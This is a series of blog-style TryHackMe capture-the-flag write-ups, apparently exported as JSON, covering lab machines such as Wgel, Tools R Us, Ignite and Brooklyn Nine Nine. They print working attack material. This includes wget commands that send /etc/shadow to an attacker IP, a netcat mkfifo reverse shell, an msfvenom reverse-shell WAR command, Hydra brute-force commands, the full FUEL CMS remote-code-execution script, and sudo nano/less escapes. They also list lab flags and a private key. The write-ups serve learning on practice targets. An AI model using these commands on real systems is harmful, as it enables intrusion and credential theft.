--decodeflag{f1rs7_fl4g}reveals a flag. This is one of the answers to the questions in the room.I did some further directory enumeration using a larger wordlist but no results were returned.Further ScanningSo that HTTP service looks like its a dead end.A full nmap scan of all ports revealed two additional ports that we missed in our initial scan. 6498 (SSH) 65542 (HTTP/Apache)These two services are not on their standard ports but nevertheless, let’s move on to enumeration.HTTP (Apache)The landing page for the web application on port 65542 is the default Apache page. Scanning the page, the third flag is available to us in plainsight.I’m not sure if we missed flag 2 but we’ll come back to it. Checking out the page source for this Apache page, there is another hidden paragraph tag with more encoded data.The sentence was about to tell us the encoding style but it cut off. I had only ever known about base64 encoding which didn’t return any meaningful data so let’s move over to Cyber Chef (great tool for data manipulation and wrangling) to try out other baseXX encoding formats.It took a few different formats to cycle though but Base62 was the encoding format. This is probably a hidden directory so let’s browse to it.Again! Another image that serves no purpose. The page source contains some data that looks like more a hash rather an encoding.Using the hash-identifier tool,it recommended two possible hashes which didn’t end up being the format of the actual hash.The first time I completed this room, I must have spent an hour trying to understand how to crack this hash. My initial instinct when rockyou doesn’t match the hash is not to try. It was only because of the unique hash name (GOST R 34.11-94), that I instantly remembered that this is the hash. First time, I tried using hashcat which requires you to specify the hash mode where as JTR can try to autodetect which it did successfully in this case.Letting John the Ripper auto-detect the hash type as the correct hash format, we obtain a password but it’s not clear what we’re supposed to do with this.Initial FootholdOne thing that we haven’t looked into is the robots.txt file for this web application.User-Agent:*Disallow:/Robots Not AllowedUser-Agent:a18672860d0510e5ab6699730763b250Allow:/This Flag Can Enter But Only This Flag No More ExceptionsI thought this was a hash but using only hash identifier tools, online rainbow tables, and brute force cracking using a password list did not return any results no matter the hash.I tried several things but no vector panned out. After a while, I just looked for a hint on how to proceed from here and it revolved the around matrix style image and steganography.Downloading the binarycodepixabay.jpg file from the /n0th1ng3ls3m4tt3rs endpoint and using the steghide tool to determine if there is any embedded data, we obtain some interesting results.When we were prompted with a passphrase, I entered in mypasswordforthatjob which was related to the hash that we found on the same page as the binarycoepixabay image.Outputting the contents of secrettext.txt,username:boringpassword:01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001there is a username and password combination which could potentially provide us our initial foothold into the target system.The password is saved as binary data so we can use CyberChef to convert this into a string that is actually usable.With the password converted, we now have access to the system.We can submit the flag in user.txt and move on to privilege escalation to obtain the root flag.Privilege EscalationListing out the sudo privileges for the boring user and they are not allowed to run sudo on this target system.Let’s search for any files owned by this user.I filtered out any files in the /proc, /sys/, /run folders as the find usually returns results for the processes owned by boring. One file stands out quite a bit, /var/www/.mysecretcronjob.sh.This may indicate the presence of a cron job.The root user is executing the .mysecretcronjob.sh file every minute. Let’s check the contents of this file to see if we can use it to our advantage and escalate our privileges!We can definitely use this to our advantage. The file is owned by boring and is also writable as us. We can add a line to generate a reverse shell back to our attacker system. All we need is a netcat listener to catch the reverse shell. Let’s give this a shot.On the left-hand side, you can see a payload that we used from the PayloadAllTheThings repository, and on the right, the netcat listener caught the reverse shell as the root user.We can find the final root flag at /root/.root.txt (hidden -.-), and finally consider this room completed.ReflectionThis room is probably one of my least favorite rooms that I’ve completed so far on the THM platform. It’s not to say it isn’t good and won’t teach you a lot. It’s very CTF heavy and requires you to be in that mindset in some situations to be able to complete this room.I required a hint or two which probably wouldn’t have been necessary if I had tried all possible vectors. Either way, this room teaches lots about cracking hashes, directory enumeration, steganography, and escalating privileges through a vulnerable cron task." }, { "title": "Wgel CTF (Try Hack Me)", "url": "/posts/thm-wgel-ctf/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-09 18:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationPerforming an nmap scan of the top 1000 ports for this target, we come across two accessible ports: 22 (SSH) 80 (HTTP)From the service information for the two open ports, the target is an Ubuntu Linux OS. Let’s enumerate those services further.HTTPThe http-title nmap script reveals that the title of the web application is the default Apache landing page title. Let’s check out the page to confirm this.Turns out the http-title script did not lie to us. There is no interesting information revealed within this page but looking deeper into the page source, and we come across some leaked information in the source code.Despite it being riddled with spelling mistakes, we can deduce two critical pieces of information: the website has not been updated meaning there may be some vulnerabilities or information there is potentially a user (jessie or Jessie) that could be useful for brute forcing the SSH service or provide access to a protected endpointLet’s now proceed with directory enumeration using gobuster.Browsing to the /sitemap endpoint, we’re presented with another landing page.Let’s obtain a more concrete picture of the application and perform another directory enumeration scan before we manually enumerate the UNAPP application.Note: gobuster is not a recursive tool so we have to perform this for each endpoint we may across.Whoa! We may not even have to browse the application at all. The .ssh directory looks very promising!Initial FootholdThe contents of id_rsa is a private key that may just be our foothold into the target.-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3xW69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsPy4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BHWo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmEAnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPaM7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobGSUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7IdcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIyGW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fhshl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+NLaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3uQJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBWV35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsueyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPbQNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7VsgjL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod-----END RSA PRIVATE KEY-----Since we enumerated the web application thoroughly at the beginning, this private key may belong to Jessie. Fingers crossed!Before we can use the private key, we need to modify the permissions to 600 so that SSH doesn’t complain.The permission scheme when you first create a file is 644 but SSH complains that the file is world-readable so it ignores the private key.Success! Our intuition turned out to be correct. The private key was valid for jessie. Once we modified the permissions for the private key, SSH stopped complaining, and we obtained our foothold into the target.The user flag is located at /home/jessie/Documents/user_flag.txt. Now we can move onto privilege escalation!User Flag: 057c67131c3d5e42dd5cd3075b198ff6Privilege EscalationFirst technique for privesc is to the check the superuser privilege for jessie.The first of two items means that jessie can execute all commands as sudo so long as a password is provided. This won’t work since we obtained access to the system using key-based authentication and not password authentication. However, the wget command can be executed as root without a password.Gtfobins, a fantastic resource for privesc, should have an entry on how we can abuse this.In this case, gtfobins was not that useful to us. Performing a bit of google-fu and we come across a great article by hackingarticles on how to exfil data using privileged wget 1.The example in the articles uses the following command to exfil the /etc/shadow file.sudo /user/bin/wget --post-file=/etc/shadow 192.168.1.17In our situation, we should be able to transfer the /etc/shadow and /etc/passwd file to our attacker machine, and crack the password using John the Ripper. Alternatively, we could exfil the /root/root_flag.txt (assuming this is the pattern since the user flag was user_flag.txt) file in the /root folder but let’s see if we can crack jessie’s password using JTR and obtain root access.Once I set up a netcat listener on port 80 redirecting any data received to a file called passwd, I use the wget command to post the file to our listener. Once the connection is established, the wget command will be expecting a valid HTTP response but we don’t care about providing that so we can kill the netcat listener and our file will be saved to disk. The file contains the HTTP headers as part of the request so we’ll take care to delete those.Now we’ll perform the same thing for the /etc/shadow file and use John the Ripper to try to crack the hash.We only care about the jessie user so I filtered out the lines that didn’t matter and used the unshadow command to combine the two into a file that John the Ripper will understand.Since this was a sha512crypt hash with 5000 rounds, it took over an hour to go through the entire rockyou wordlist. At the end of it, there was no match.Knowing that I could already get the root flag easily, I decided to look at a few writeups to see if they tried to crack jessie’s hashed password and all of them used wget to read or exfil the flag.We have completed this room!Root Flag: b1b968b37519ad1daa6408188649263dUseful CommandsData Exfil using Wget and NetcatCreate a netcat listener on port 80 saving the received data to a file.nc -nvlp 80 &gt; file.txtWget command to exfiltrate the data to your netcat listener.wget --post-file=/etc/shadow 10.6.5.103ReflectionThe first time I completed this room, I did not search through the source code of that default Apache page so I did not have knowledge of the user “jessie”. I think I’ve learned my lesson as my first instinct even with the default Apache page is to search through all page sources for any information leakage.If you don’t fall into any rabbit holes, this room can be fairly straightforward. This is the first room I’ve come across where wget is a binary that is able to run as sudo so I enjoyed learning the number of things I can do to exfiltrate data or read local files.So far, this journey to document all of my previously completed rooms has surprised me on how much I have learned. I have a long way to go but I’ve become very comfortable solving the easy rooms on Try Hack Me. Once I complete these old writeups, I think it’s definitely time I upgraded to the Medium rated rooms.References https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/ &#8617; " }, { "title": "Tools R Us (Try Hack Me)", "url": "/posts/thm-toolsrus/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-08 21:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationFirst things first, let’s begin with an nmap scan of the target of the top 1000 common ports.From an initial assessment, the target is an Ubuntu OS as specified in the version information for a few of the services. There are 4 ports open: 22 (SSH) 80 (HTTP) 1234 (HTTP) 8009 (AJP13)80 (HTTP)The landing page does not provide much information but it states that other parts of the website are still functional.With no details in the source code and no robots.txt file present, let’s move on to our favorite web application enumerate, directory busting!Running gobuster with the common.txt wordlist as part of the seclists repository, we have a few hits!The two interesting endpoints in the results are /guidelines and /protected. /protected is protected (haha) by HTTP Basic authentication and with no credentials, there’s not much other than brute force authentication. However, the /guidelines endpoint contains some information that we could potentially use to our advantage.There may be a chance that the Apache Tomcat server running on port 1234 might be outdated and exploitable. Let’s find out!1234 (HTTP)This is the default page for the Apache Tomcat server. Through previous experience with exploiting this specific Apache service, one vector was to upload a WAR reverse shell payload to the Manager App section. Administrative access required credentials but this was usually a default set of credentials which may be the case here as well.I captured the HTTP Basic authentication request to the /manager/html endpoint (Manager App panel) in Burpsuite and used a default Tomcat credential list 1 with the Intruder feature. However, none of the default credential combinations provided us access. Burpsuite also throttles the Intruder attack so using larger username and password lists would result in a slow attack. Instead, we can use Hydra’s http-get module to perform the brute force authentication attack 2.I banged my head on obtaining access to the Tomcat Manager and the /protected endpoint of the web application at port 80. I spent an hour only to realize a massive oversight on my part. I’ll provide a brief summary of what I accomplished.Bonehead MoveI modified the example Hydra command from the reference provided above;hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -s 1234 10.10.80.207 http-get /manager/htmlwith no successful username and password combination. It took a few minutes but it clicked that in the /guidelines endpoint, the note was left for “bob”. Removing the option for a username list, I selected the username “bob” for the command but that also returned no results.I then pivoted to use the same command for the /protected endpoint and Hydra reported a pair of successful credentials using the same username and password list.Checking out the page at /protectedOkay! Looks like that page has moved to another endpoint. This must be the protected Manager App admin panel from the Apache Tomcat application. Trying out the creds bob:bubbles for the Tomcat application failed.I fumbled for a while searching for other vulnerabilities for the Apache Tomcat and the Apache JServ service at port 8009. The combination of Tomcat and JServ is open to the Ghostcat vulnerability but it didn’t seem like this was the intended route.After some time, I decided to try the credentials again for the Manager App and it worked! I couldn’t believe it. Thinking that the application bugged out and let me in unintentionally (weird though but I was confused), I tried the hydra command again. Unfortunately, Hydra returned no results. I opened up an incognito window, tried the creds again, and it rejected the credentials. At this point, I did not understand how I successfully authenticated once but failed afterwards.So far, I had spent an hour searching for other ports through a full nmap scan, researched other vulnerabilities, performed more directory enumeration, but nothing was working. I stepped away from the computer, took a break, and within five minutes, it hit me. Apache Tomcat will lock the user out of their account after some number of authentication attempts for a specific amount of time. What must have happened when I successfully logged in and thought the application had bugged out was that the account must have become unlocked after some amount of time. The subsequent hydra attempt must have then locked me out again.With that out of the way, let’s login to the Tomcat Application Manager.Initial FootholdWith authenticated access to the Web Application Manager for Apache Tomcat, we can deploy a WAR package which can generate a reverse shell to our attacker system.Instead of using the Metasploit module which will do all of the work for us, let’s try to exploit this manually just for some practice generating payloads 3.We can generate a WAR payload with the following command:msfvenom -p java/meterpreter/reverse_tcp LHOST=10.6.5.103 LPORT=4444 -f war &gt; shell.war -p java/meterpreter/reverse_tcp: Staged Meterpreter payload LHOST=10.6.5.103 LPORT=444: IP/port combination for the reverse shell -f war: Output in a WAR file formatOnce we deploy the WAR file through the Application Manager GUI, we can see and browse to /shell under the list of Applications.Since we are using a staged Meterpreter payload, we’ll need to configure the handler module in Metasploit to send the stager payload which will generate a Meterpreter shell for us.I did try to use a shell reverse tcp payload but when the reverse connection occurred, the Java application would error out with an OutOfMemoryError.We’ll configure the handler module with the accept parameters that we used to create the WAR payload. Once configured and running, we can click on /shell and see our second stage Meterpreter payload sent and a session opened up!Even better is that we have access to the system as root so privilege escalation isn’t even required!This room only has a root flag and it is located at /root.Root Flag: ff1fc4a81affcc7688cf89ae7dc6e0e1And with that, we have completed the room!Useful CommandsHydra Basic AuthenticationI may have covered this in a previous writeup but to brute force HTTP Basic Authentication using Hydra:hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -s 1234 10.10.80.207 http-get /manager/html -L users.txt: username list -P darkweb2017-top1000.txt: password list -s 1234: different port other than port 80 10.10.80.207: target http-get: module to use with hydra /manager/html: module parameter which is a pathMsfvenom Java WAR PayloadThis is copied exactly as described above but kept down here for future referencing.msfvenom -p java/meterpreter/reverse_tcp LHOST=10.6.5.103 LPORT=4444 -f war &gt; shell.war -p java/meterpreter/reverse_tcp: Staged Meterpreter payload LHOST=10.6.5.103 LPORT=444: IP/port combination for the reverse shell -f war: Output in a WAR file formatReflectionThis must be my third time exploiting an Apache Tomcat service within an intentionally vulnerable machine but the miniscule fact that accounts can be locked out evaded me this time. For this room, despite not learning any new techniques, I learned that taking a step away from the keyboard can lead to new insights (or old ones that slipped your mind).For a straight path from enumeration to exploitation, this room does not have many steps to it. There is no privilege escalation as the Apache Tomcat service is run by the root user. However, the experience with generating payloads using msfvenom and catching staged payloads with metasploit’s handler module make this room an interesting challenge.References https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown &#8617; https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#bruteforce &#8617; https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/ &#8617; " }, { "title": "Ignite (Try Hack Me)", "url": "/posts/thm-ignite/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-09-07 19:30:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationLet’s begin with an nmap scan of the top 1000 ports.The target is an Ubuntu Linux OS with one open port on port 80, an HTTP web server. We didn’t perform a scan of full range of ports so there may be other ports open but let’s enumerate the HTTP service first before performing a full port scan.HTTPSome pieces of information that we obtained from the nmap results for this service: Running Apache 2.4.10 Robots.txt file with 1 Disallow entry Title of page is FUEL CMS (may be an actual CMS product)Checking out the landing page for the web application and we are presented with what looks like the default page for the FUEL CMS. It looks like the developers never bothered modifying the default page which provides critical enumeration data.Scrolling down to the bottom of the page, we come across a set of default credentials for the Fuel CMS upon installation.If the system administrator of this web application did not modify the default landing page, maybe they did not modify the default credentials.Browsing to /fuel (also the disallowed entry in robots.txt), we are presented with the login page for the administrative section of the Fuel CMS.That worked out beautifully for us! Looks like the system administrator never bothered modifying the default credentials. We are now authenticated to the web service as the administrator of the application.Initial FootholdI tried to explore the administrative console looking for opportunities to upload a PHP reverse shell but it doesn’t seem like there were any apparent vectors within the administrative console to make this happen.From the default landing page, we know that the version of the CMS is 1.4 and since it is a product supported by a vendor, we can use searchsploit to search for any public exploits.Looks like there is an exploit available for the version of the FUEL CMS that we are attacking! Let’s dump the contents of the exploit as it is a Python script and fairly short.# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)# Date: 2019-07-19# Exploit Author: 0xd0ff9# Vendor Homepage: https://www.getfuelcms.com/# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1# Version: &lt;= 1.4.1# Tested on: Ubuntu - Apache2 - php5# CVE : CVE-2018-16763import requestsimport urlliburl = \"http://127.0.0.1:8881\"def find_nth_overlapping(haystack, needle, n): start = haystack.find(needle) while start &gt;= 0 and n &gt; 1: start = haystack.find(needle, start+1) n -= 1 return startwhile 1:\txxxx = raw_input('cmd:')\tburp0_url = url+\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"+urllib.quote(xxxx)+\"%27%29%2b%27\"\tproxy = {\"http\":\"http://127.0.0.1:8080\"}\tr = requests.get(burp0_url, proxies=proxy)\thtml = \"&lt;!DOCTYPE html&gt;\"\thtmlcharset = r.text.find(html)\tbegin = r.text[0:20]\tdup = find_nth_overlapping(r.text,begin,2)\tprint r.text[0:dup]I won’t pretend to be able to understand exactly how this is working but we can search for the CVE number (CVE-2018-16763) and try to read through the details of the CVE 1. The CVE documentation refers to a GitHub issue for FUEL CMS addressing the vulnerability 2.The GitHub issue details that the /fuel/pages/select URL with the filter parameter can lead to code evaluation. If we decode the data after the filter= with a value of xxxx = 'cmd:which nc', we can try to understand the payload.&gt;&gt;&gt; xxxx = \"cmd:which nc\"&gt;&gt;&gt; payload = \"%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"+urllib.quote(xxxx)+\"%27%29%2b%27\"&gt;&gt;&gt; urllib.unquote(payload)\"'+pi(print($a='system'))+$a('cmd:which nc')+'\"Without being an expert in PHP, it looks like it’s printing out the word system and then calling the system function to execute the command that we provided. Clearly, this is a MAJOR vulnerability which is why it’s listed with a critical score of 9.8. With a deeper understanding of the exploit, let’s make a few tweaks to the exploit removing the Burpsuite proxy and run it!import requestsimport urllibcms_url = \"http://10.10.221.136\"def find_nth_overlapping(haystack, needle, n): start = haystack.find(needle) while start &gt;= 0 and n &gt; 1: start = haystack.find(needle, start+1) n -= 1 return startwhile 1:\tcmd = raw_input('cmd: ')\turl = cms_url+\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"+urllib.quote(cmd)+\"%27%29%2b%27\"\tr = requests.get(url)\thtml = \"&lt;!DOCTYPE html&gt;\"\thtmlcharset = r.text.find(html)\tbegin = r.text[0:20]\tdup = find_nth_overlapping(r.text,begin,2)\tprint r.text[0:dup]Great! Let’s test the exploit with a simple whoami command.The exploit returned the output of the whoami command prefixed with the word system as outlined in the red box in the image above along with some PHP errors that we can ignore. Now that we know that the PHP command evaluation is possible, let’s setup a reverse shell to our attacker machine.First things first, let’s set up a netcat listener on port 4444.Next, let’s check if netcat exists on the system and try to generate a reverse shell with the -e parameter. That did not trigger the connection. Trying out various payloads through the PayloadAllTheThings repository 3, the payload that ultimately triggered the reverse connection was the netcat-openbsd payload.Looks like we got a reverse shell as the www-data user which is the owner of the web application.Looking at the users in the /home directory, there is an entry for www-data (unusual) but the user flag is present in this directory as flag.txt.Now let’s proceed to some privilege escalation techniques.Privilege EscalationIf we look back at the landing page, you’ll recall that there is a reference to the database configuration file.Outputting the contents of the file, we find the username and password for the access to the MySQL server as the user root.$db['default'] = array(\t'dsn'\t=&gt; '',\t'hostname' =&gt; 'localhost',\t'username' =&gt; 'root',\t'password' =&gt; 'mememe',\t'database' =&gt; 'fuel_schema',\t'dbdriver' =&gt; 'mysqli',\t'dbprefix' =&gt; '',\t'pconnect' =&gt; FALSE,\t'db_debug' =&gt; (ENVIRONMENT !== 'production'),\t'cache_on' =&gt; FALSE,\t'cachedir' =&gt; '',\t'char_set' =&gt; 'utf8',\t'dbcollat' =&gt; 'utf8_general_ci',\t'swap_pre' =&gt; '',\t'encrypt' =&gt; FALSE,\t'compress' =&gt; FALSE,\t'stricton' =&gt; FALSE,\t'failover' =&gt; array(),\t'save_queries' =&gt; TRUE);Connecting to the MySQL server and searching through the fuel_schema database, we don’t find any useful information so let’s move on to other privesc techniques.At this stage, I went through the various techniques that I remember such as searching for misconfigured SUID binaries, writable files, and even an execution of LinPEAS but nothing stood out to me. However, it clicked that if the MySQL username and password combo is root, then maybe the system root user also has the same password.And voila! Although it isn’t visible, the password for the system root user was mememe. We have also found the root flag meaning that this box is done!https://unicornsec.com/home/tryhackme-igniteUseful CommandsNetcat OpenBSD Reverse Shellrm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.6.5.103 4444 &gt;/tmp/fCourtesy of Jared from unicornsec 4, I’ll use his fantastic summary of this command: rm /tmp/f: remove the file if it exists mkfifo /tmp/f: create a named pipe cat /tmp/f |: pipe the contents of the named pipe into the next command /bin/bash -i 2&gt;&amp;1 |: invoke interactive mode with Bash, redirect stderr to stdout and pipe that into the next command nc 10.6.5.103 4444 &gt; /tmp/f: connect netcat to the remote IP/port and output to the named pipeFrom what I understand, this creates a loop where the data passed to netcat from the attacker machine is sent to the named pipe, which is then piped to the bash process which then pipes the output into the netcat connection and repeat.ReflectionThe first time I completed this room, I skimmed through this page without reading it carefully and moved onto directory enumeration, brute-force authentication attempts. This made my life far more difficult and I had to look for a hint in writeups to understand how to proceed when it came to the privilege escalation vector. I didn’t bother to take my time and read through the landing page to understand all the details of the application.On another note, as I read through other walkthroughs to understand how others approach this box, I realize that I do not take the time and effort to understand how specific commands or exploits work. Even though I’m not an exploit dev, it’s important to take the time to understand what the exploit is doing at a higher level as this elevates your knowledge and puts me slightly above the level of “script kiddie”.With the above two points, it’s important to slow down, take the time to understand the finer details as I may miss out on crucial information and use the opportunity to learn the aspects (commands, exploits, etc) that seem foreign to me.This room does not contain many rabbit holes and provides a fairly straight forward exploitation path. However, the ability to use public exploits and modify them to use them for our own situation is not a vector that many rooms include which is why I enjoyed Ignite.References https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-16763 &#8617; https://github.com/daylightstudio/FUEL-CMS/issues/478 &#8617; https://github.com/swisskyrepo/PayloadsAllTheThings &#8617; https://unicornsec.com/home/tryhackme-ignite &#8617; " }, { "title": "Brooklyn Nine Nine (Try Hack Me)", "url": "/posts/thm-b99/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup, ssh, nano, steganography, reverse shell, less, hydra, brute force, ftp, privesc, web application", "date": "2021-09-06 19:45:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.Note: The target IP address may change throughout the writeup as I complete the room over a period of time.ScenarioTitle: Brooklyn Nine NineLink: https://tryhackme.com/room/brooklynninenineDescription: This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.Free/Subsciber: FreeDifficulty: EasyEnumerationAs always, let us start off with the nmap scan.Open Ports: 21 (FTP) 22 (SSH) 80 (HTTP)Target OS Type: Ubuntu Linux (indicated in the version information for SSH and Apache services)FTPSome interesting information was obtained with the default scripts for the FTP service.The ftp-anon script from the nmap results indicate that anonymous login is allowed. The script also performed a listing of the files and there is one file that is world-readable, note_to_jake.txt.Downloading the file from the server, the contents are:From Amy,Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nineJake’s password appears to be weak! Since the SSH service is open, we could use Hydra or another brute-force tool to access the target. However, let’s enumerate the other services before going down that road.HTTPThe landing page displays a full-screen image of the cast of Brooklyn Nine-Nine with some text at the bottom that isn’t important.Checking out the page source, there is a hint about steganography.Let’s download the background-image, brooklyn99.jpg and analyze the image for any embedded data.Initial FootholdSteganographyWith embedded data hidden within an image, steghide is the primary tool to extract this embedded information. Sometimes this data can be protected by a passphrase so we might have to use another tool to brute force the passphrase.In this case, steghide requests us to provide a passphrase. We can use stegseek to crack the passphrase given a wordlist 1.Looks like the passphrase was admin and the embedded data was another note, this time including Captain Holt’s password.Holts Password:fluffydog12@ninenineEnjoy!!With a potential combination of username and password, holt:fluffydog12@ninenine, let’s try to use these with the SSH service.Fantastic! It looks like the embedded data within the image was our initial foothold into the system. Let’s grab the user.txt flag within Holt’s home directory and move on to the privilege escalation stage to obtain root access.User Flag: ee11cbb19052e40b07aac0ca060c23eePrivilege EscalationThe holt user is able to execute the nano program with no password.Let’s check out gtfobins for any methods to escalate our privileges using nano.GTFObins contains an entry to obtain root privileges if we have SUDO permission for the nano binary 2. We could either use the command provided to obtain a root shell or use a reverse shell connection back to our attacker system.Reverse ShellI’ll set up a netcat listener to accept the reverse shell connection. Once we open up the Nano editor as sudo, we execute the ctrl+R and ctrl+X combination which allows us to run a command.Let’s swap out the second half of the command which calls a shell process as root for a reverse shell command from the PayloadAllTheThings repository 3.Following the steps specified on gtfobins, we are presented with the ability to execute a command. Using a Bash TCP payload from the repository, you can see below that the netcat listener caught the reverse shell connection attempt as the root user.We find the final flag available at /root and with that, we have completed this room!Root Flag: 63a9f0ea7bb98050796b649e85481845ReflectionThe second time around and this room is still one of the easiest rooms on TryHackMe that I have come across so far but also one of my favorite because of Brooklyn Nine-Nine being one of my favorite shows.Alternate PathThe room description did indicate that there were two different paths to rooting this box. The first pathway involved steganography to obtain access to Holt’s account but we did encounter a note in the FTP server telling Jake to improve his weak password. Let’s explore that vector.Using Hydra and a subset of the rockyou.txt wordlist, let’s attack the SSH service for jake.Looks like Jake did use a very weak password! Once authenticated as jake and in a similar fashion to Holt, we display Jake’s sudo privileges.The amazing tool that GTFObins is, it contains an entry on exploiting this binary for privilege escalation 4.Using the exact set of commands detailed in the image above from GTFObins, we obtain root privileges which is the second intended pathway to obtain root for this room.This room was fairly easy and did not teach me new tactics other than how to abuse the less and nano binaries if they have sudo privileges. The room was still enjoyable given that it was a Brooklyn Nine-Nine themed room!Killchain SummaryInitial Path View the index page source for a hint about steganography. Brute force the passphrase for the embedded data in background.jpg using stegseek. Find Holt’s password in the embedded data. Authenticate to the target as holt and escalate privileges with nano with a reverse shell payload.Alternate Path Anonymously authenticate to the FTP server to find a note that says Jake’s password is weak. Brute force the SSH service as jake to find the password 987654321. Escalate privileges by abusing the sudo privileges of Jake through the less binary.Misconfigurations The users, jake and holt, should not have had sudo privileges to less and nano. The index page should not have contained a hint about steganography. The SSH service should not allow password-based authentication. Lock down the host-based firewall to prevent outgoing reverse shell connections.Summary of ExploitsPrivilege EscalationNanoIF nano has sudo privileges enabled, obtain a root shell by: Launching the nano program as sudo Press CTRL+R Press CTRL+X Enter reset; sh 1&gt;&amp;0 2&gt;&amp;0The combination of ^R^X allows you to execute commands. The above command will allow you to execute commands while redirecting both stdout and stderr to stdin. Without the redirection, you would be able to execute commands but not see the results of the command execution.LessIF less has sudo privileges enabled, obtain a root shell by: Launching the less program as sudo Enter !/bin/shYou are able to execute commands within less by prefixing the command with !.Things I Learned Escalating privileges by abusing the sudo permissions of nano. Using stegseek to brute force passphrases for embedded data in a JPEG image.References https://github.com/RickdeJager/stegseek &#8617; https://gtfobins.github.io/gtfobins/nano/#sudo &#8617; https://github.com/swisskyrepo/PayloadsAllTheThings &#8617; 